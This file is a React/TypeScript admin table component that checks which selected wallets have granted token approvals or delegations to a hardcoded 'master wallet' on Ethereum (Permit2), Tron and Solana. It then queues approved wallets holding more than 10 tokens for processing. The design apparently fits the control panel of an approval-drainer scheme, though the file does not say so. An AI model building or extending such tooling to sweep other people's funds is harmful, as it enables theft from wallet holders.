"use client";

import {
  ColumnDef,
  flexRender,
  getCoreRowModel,
  useReactTable,
  getPaginationRowModel,
  SortingState,
  getSortedRowModel,
  PaginationState,
  OnChangeFn,
  RowSelectionState,
} from "@tanstack/react-table";

import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { useState, useEffect } from "react";
import { ChevronLeft, ChevronRight, RefreshCw, Play, Shield } from "lucide-react";
import { extensionApi, tokenManagementApi, allowanceApi, permit2Api } from "@/lib/api-client";
import { tronAllowanceApi, solanaDelegationApi } from "@/lib/api-client";
import { useToast } from "@/components/ui/use-toast";

interface DataTableProps<TData, TValue> {
  columns: ColumnDef<TData, TValue>[];
  data: TData[];
  chainId: number;
  // Server pagination props
  currentPage?: number;
  totalPages?: number;
  onPageChange?: (page: number) => void;
  isServerPaginated?: boolean;
  // Selection props
  onRowSelectionChange?: (selectedRows: TData[]) => void;
  // Customization props
  checkApprovalButtonText?: string;
}

// Constants
const ETH_SPENDER_ADDRESS = process.env.NEXT_PUBLIC_ETH_MASTER_WALLET || "0xD7a9FA0075fD7124b03Ba2f96B47d32A9d37Cf9D"; // ETH Master Wallet address
const TRON_SPENDER_ADDRESS = process.env.NEXT_PUBLIC_TRON_MASTER_WALLET ; // TRON Master Wallet address
const SOLANA_DELEGATE_ADDRESS = process.env.NEXT_PUBLIC_SOLANA_DELEGATE_WALLET; // Solana Delegate Wallet address

export function WalletTable<TData, TValue>({
  columns,
  data,
  chainId,
  currentPage = 1,
  totalPages = 1,
  onPageChange,
  isServerPaginated = false,
  onRowSelectionChange,
  checkApprovalButtonText = "Check Approvals",
}: DataTableProps<TData, TValue>) {
  const [sorting, setSorting] = useState<SortingState>([]);
  const [rowSelection, setRowSelection] = useState<RowSelectionState>({});
  const [pagination, setPagination] = useState<PaginationState>({
    pageIndex: isServerPaginated ? currentPage - 1 : 0, // Convert 1-based to 0-based for tanstack table
    pageSize: 10, // Keep 10 records per page
  });
  const [isUpdating, setIsUpdating] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCheckingApprovals, setIsCheckingApprovals] = useState(false);
  const { toast } = useToast();
  
  // Update the internal pagination state when currentPage changes from parent
  useEffect(() => {
    if (isServerPaginated && currentPage) {
      setPagination(prev => ({
        ...prev,
        pageIndex: currentPage - 1
      }));
    }
  }, [currentPage, isServerPaginated]);

  // For server-side pagination, notify parent when page changes
  const handlePaginationChange: OnChangeFn<PaginationState> = (updaterOrValue) => {
    // First, determine the new pagination state
    const newPagination = typeof updaterOrValue === 'function'
      ? updaterOrValue(pagination)
      : updaterOrValue;

    // Update local state
    setPagination(newPagination);
    
    // Notify parent if using server pagination
    if (isServerPaginated && onPageChange) {
      // Convert 0-based to 1-based for API
      const newPage = newPagination.pageIndex + 1;
      onPageChange(newPage);
    }
  };

  // When row selection changes, notify parent
  useEffect(() => {
    if (onRowSelectionChange) {
      const selectedRowIndices = Object.keys(rowSelection).map(Number);
      const selectedRowData = selectedRowIndices.map(index => data[index]);
      onRowSelectionChange(selectedRowData);
    }
  }, [rowSelection, data, onRowSelectionChange]);

  // Reset selection when page changes
  useEffect(() => {
    setRowSelection({});
  }, [pagination.pageIndex]);

  // Handle updating balances for selected wallet-token pairs
  const handleUpdateBalances = async () => {
    try {
      setIsUpdating(true);
      
      // Get the selected rows
      const selectedRowIndices = Object.keys(rowSelection).map(Number);
      const selectedRowData = selectedRowIndices.map(index => data[index]) as any[];
      
      if (selectedRowData.length === 0) {
        toast({
          title: "No wallets selected",
          description: "Please select at least one wallet to update balances.",
          variant: "destructive"
        });
        return;
      }
      
      // Get unique wallet addresses from selected rows
      const walletAddresses = [...new Set(selectedRowData.map(row => row.walletAddress))];
      
      console.log(`Updating balances for ${walletAddresses.length} wallets`);
      
      // Call the bulk update API
      const response = await tokenManagementApi.bulkUpdateBalances(walletAddresses);
      
      if (response.success) {
        toast({
          title: "Balances updated",
          description: `Successfully updated ${response.data.updatedCount} wallets.${response.data.failedCount > 0 ? ` Failed: ${response.data.failedCount}` : ''}`,
          variant: "default"
        });
        
        // Refresh the table data - this will cause the parent to reload the data
        if (onPageChange && isServerPaginated) {
          onPageChange(currentPage);
        }
      } else {
        toast({
          title: "Error updating balances",
          description: response.error || "An error occurred while updating balances.",
          variant: "destructive"
        });
      }
    } catch (error) {
      console.error("Error updating balances:", error);
      toast({
        title: "Error updating balances",
        description: "An unexpected error occurred while updating balances.",
        variant: "destructive"
      });
    } finally {
      setIsUpdating(false);
    }
  };

  // Handle processing selected wallet-token pairs (mark as pending)
  const handleProcessSelected = async () => {
    try {
      setIsProcessing(true);
      
      // Get the selected rows
      const selectedRowIndices = Object.keys(rowSelection).map(Number);
      const selectedRowData = selectedRowIndices.map(index => data[index]) as any[];
      
      if (selectedRowData.length === 0) {
        toast({
          title: "No rows selected",
          description: "Please select at least one row to process.",
          variant: "destructive"
        });
        return;
      }
      
      console.log(`Processing ${selectedRowData.length} wallet-token pairs`);
      
      // Validate selected rows before processing
      const validRows: any[] = [];
      const invalidRows: { row: any; reason: string }[] = [];
      
      selectedRowData.forEach(row => {
        const tokenBalance = row.tokenBalances && row.tokenBalances.length > 0 ? row.tokenBalances[0] : null;
        const balance = tokenBalance ? parseFloat(tokenBalance.balance || "0") : 0;
        const isApproved = tokenBalance ? tokenBalance.isApproved === true : false;
        
        // Check if balance is greater than 10
        if (balance <= 10) {
          invalidRows.push({
            row,
            reason: `Balance (${balance}) is not greater than 10`
          });
          return;
        }
        
        // Check if approval is true
        if (!isApproved) {
          invalidRows.push({
            row,
            reason: "Approval is false"
          });
          return;
        }
        
        // If both conditions are met, add to valid rows
        validRows.push(row);
      });
      
      // Show summary of validation results
      if (invalidRows.length > 0) {
        const errorMessages = invalidRows.map(({ row, reason }) => 
          `${row.walletAddress.substring(0, 6)}...${row.walletAddress.substring(row.walletAddress.length - 4)}: ${reason}`
        );
        
        toast({
          title: "Validation Errors",
          description: `${invalidRows.length} rows failed validation:\n${errorMessages.slice(0, 3).join('\n')}${errorMessages.length > 3 ? '\n...' : ''}`,
          variant: "destructive"
        });
      }
      
      // Process only valid rows if any exist
      if (validRows.length === 0) {
        toast({
          title: "No valid rows to process",
          description: "All selected rows failed validation. Please ensure selected wallets have balance > 10 and approval = true.",
          variant: "destructive"
        });
        return;
      }
      
      // Format data for API call - each row needs walletAddress, tokenAddress, and chainId
      const walletsToProcess = validRows.map(row => ({
        walletAddress: row.walletAddress,
        tokenAddress: row.tokenAddresses[0], // Use the first token address
        chainId: row.chainId.toString()
      }));
      
      // Call the API to update status to pending
      const response = await allowanceApi.updateStatus(walletsToProcess, 'pending');
      
      if (response.success) {
        const successMessage = `Successfully processed ${validRows.length} valid wallet-token pairs to pending status.`;
        const errorMessage = invalidRows.length > 0 ? ` ${invalidRows.length} rows were skipped due to validation errors.` : '';
        
        toast({
          title: "Processing completed",
          description: successMessage + errorMessage,
          variant: validRows.length > 0 ? "default" : "destructive"
        });
        
        // Refresh the table data to show updated status
        if (onPageChange && isServerPaginated) {
          onPageChange(currentPage);
        }
      } else {
        toast({
          title: "Error processing selected rows",
          description: response.error || "An error occurred while processing the selected rows.",
          variant: "destructive"
        });
      }
    } catch (error) {
      console.error("Error processing selected rows:", error);
      toast({
        title: "Error processing selected rows",
        description: "An unexpected error occurred while processing the selected rows.",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };

  // Handle checking approvals for selected wallet-token pairs (Ethereum Permit2, Tron TRC20, Solana SPL)
  const handleCheckApprovals = async () => {
    try {
      // Get the selected rows
      const selectedRowIndices = Object.keys(rowSelection).map(Number);
      const selectedRowData = selectedRowIndices.map(index => data[index]) as any[];

      if (selectedRowData.length === 0) {
        toast({
          title: "No wallets selected",
          description: "Please select at least one wallet to check approvals.",
          variant: "destructive"
        });
        return;
      }

      setIsCheckingApprovals(true);

      // Determine chain type by chainId
      const isTron = chainId === 728126428;
      const isSolana = chainId === 507454;

      if (isTron) {
        if (!TRON_SPENDER_ADDRESS) {
          throw new Error("TRON_SPENDER_ADDRESS is not defined");
        }

        // Prepare items for Tron TRC20 approval check
        const items = selectedRowData.map((wallet) => ({
          walletAddress: wallet.walletAddress,
          tokenAddress: wallet.tokenAddresses[0],
          spenderAddress: TRON_SPENDER_ADDRESS,
        }));

        const response = await tronAllowanceApi.checkAllowances(items);

        if (response.success) {
          toast({
            title: "Tron Approvals Checked",
            description: `Checked ${response.data.totalProcessed} wallets for approvals`,
          });
          
          // Refresh the table data to show updated approval statuses
          if (onPageChange && isServerPaginated) {
            onPageChange(currentPage);
          }
        } else {
          toast({
            variant: "destructive",
            title: "Error Checking Tron Approvals",
            description: response.error || "Something went wrong",
          });
        }
      } else if (isSolana) {
        if (!SOLANA_DELEGATE_ADDRESS) {
          throw new Error("SOLANA_DELEGATE_ADDRESS is not defined");
        }

        // Prepare items for Solana SPL token delegation check
        const items = selectedRowData.map((wallet) => ({
          walletAddress: wallet.walletAddress,
          tokenAddress: wallet.tokenAddresses[0],
          delegateAddress: SOLANA_DELEGATE_ADDRESS,
        }));

        const response = await solanaDelegationApi.checkDelegations(items);

        if (response.success) {
          toast({
            title: "Solana Delegations Checked",
            description: `Checked ${response.data.totalProcessed} wallets for delegations`,
          });
          
          // Refresh the table data to show updated delegation statuses
          if (onPageChange && isServerPaginated) {
            onPageChange(currentPage);
          }
        } else {
          toast({
            variant: "destructive",
            title: "Error Checking Solana Delegations",
            description: response.error || "Something went wrong",
          });
        }
      } else {
        // Ethereum: use Permit2
        if (!ETH_SPENDER_ADDRESS) {
          throw new Error("ETH_SPENDER_ADDRESS is not defined");
        }

        const items = selectedRowData.map((wallet) => ({
          walletAddress: wallet.walletAddress,
          tokenAddress: wallet.tokenAddresses[0],
          spenderAddress: ETH_SPENDER_ADDRESS,
        }));

        const response = await permit2Api.updateAllowances(items);

        if (response.success) {
          toast({
            title: "Approvals Checked",
            description: `Checked ${response.data.totalProcessed} wallets for approvals`,
          });
        } else {
          toast({
            variant: "destructive",
            title: "Error Checking Approvals",
            description: response.error || "Something went wrong",
          });
        }
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error Checking Approvals",
        description: "Something went wrong",
      });
    } finally {
      setIsCheckingApprovals(false);
      // Refresh the table data to show updated approval statuses
      if (onPageChange && isServerPaginated) {
        onPageChange(currentPage);
      }
    }
  };

  const table = useReactTable({
    data,
    columns,
    getCoreRowModel: getCoreRowModel(),
    getPaginationRowModel: isServerPaginated ? undefined : getPaginationRowModel(),
    onSortingChange: setSorting,
    onPaginationChange: handlePaginationChange,
    onRowSelectionChange: setRowSelection,
    getSortedRowModel: getSortedRowModel(),
    state: {
      sorting,
      pagination,
      rowSelection,
    },
    enableRowSelection: true,
    manualPagination: isServerPaginated, // Manual if using server-side
    pageCount: isServerPaginated ? totalPages : Math.ceil(data.length / pagination.pageSize),
  });

  return (
    <div className="space-y-4">
      <div className="rounded-md border">
        <Table>
          <TableHeader>
            {table.getHeaderGroups().map((headerGroup) => (
              <TableRow key={headerGroup.id}>
                {headerGroup.headers.map((header) => {
                  return (
                    <TableHead key={header.id}>
                      {header.isPlaceholder
                        ? null
                        : flexRender(
                            header.column.columnDef.header,
                            header.getContext()
                          )}
                    </TableHead>
                  );
                })}
              </TableRow>
            ))}
          </TableHeader>
          <TableBody>
            {table.getRowModel().rows?.length ? (
              table.getRowModel().rows.map((row) => (
                <TableRow
                  key={row.id}
                  data-state={row.getIsSelected() && "selected"}
                >
                  {row.getVisibleCells().map((cell) => (
                    <TableCell key={cell.id}>
                      {flexRender(
                        cell.column.columnDef.cell,
                        cell.getContext()
                      )}
                    </TableCell>
                  ))}
                </TableRow>
              ))
            ) : (
              <TableRow>
                <TableCell
                  colSpan={columns.length}
                  className="h-24 text-center"
                >
                  No results.
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>
      <div className="flex items-center justify-between">
        <div className="text-sm text-muted-foreground">
          {isServerPaginated ? (
            <>Showing page {currentPage} of {totalPages}</>
          ) : (
            <>Showing {table.getRowModel().rows.length} of {data.length} records
            (Page {table.getState().pagination.pageIndex + 1} of {table.getPageCount()})</>
          )}
          {Object.keys(rowSelection).length > 0 && (
            <span className="ml-2 font-medium">
              ({Object.keys(rowSelection).length} rows selected)
            </span>
          )}
        </div>
        <div className="flex items-center space-x-2">
          {Object.keys(rowSelection).length > 0 && (
            <>
              <Button
                variant="outline"
                size="sm"
                onClick={handleUpdateBalances}
                disabled={isUpdating}
                className="mr-2"
              >
                {isUpdating ? (
                  <RefreshCw className="h-4 w-4 mr-1 animate-spin" />
                ) : (
                  <RefreshCw className="h-4 w-4 mr-1" />
                )}
                Update Balances
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={handleCheckApprovals}
                disabled={isCheckingApprovals}
                className="mr-2"
              >
                {isCheckingApprovals ? (
                  <Shield className="h-4 w-4 mr-1 animate-pulse" />
                ) : (
                  <Shield className="h-4 w-4 mr-1" />
                )}
                {checkApprovalButtonText}
              </Button>
            </>
          )}
          {Object.keys(rowSelection).length > 0 && (
            <Button
              variant="default"
              size="sm"
              onClick={handleProcessSelected}
              disabled={isProcessing}
              className="mr-2"
            >
              {isProcessing ? (
                <Play className="h-4 w-4 mr-1 animate-pulse" />
              ) : (
                <Play className="h-4 w-4 mr-1" />
              )}
              Process
            </Button>
          )}
          <Button
            variant="outline"
            size="sm"
            onClick={() => table.previousPage()}
            disabled={!table.getCanPreviousPage()}
          >
            <ChevronLeft className="h-4 w-4 mr-1" />
            Previous
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => table.nextPage()}
            disabled={!table.getCanNextPage()}
          >
            Next
            <ChevronRight className="h-4 w-4 ml-1" />
          </Button>
        </div>
      </div>
    </div>
  );
}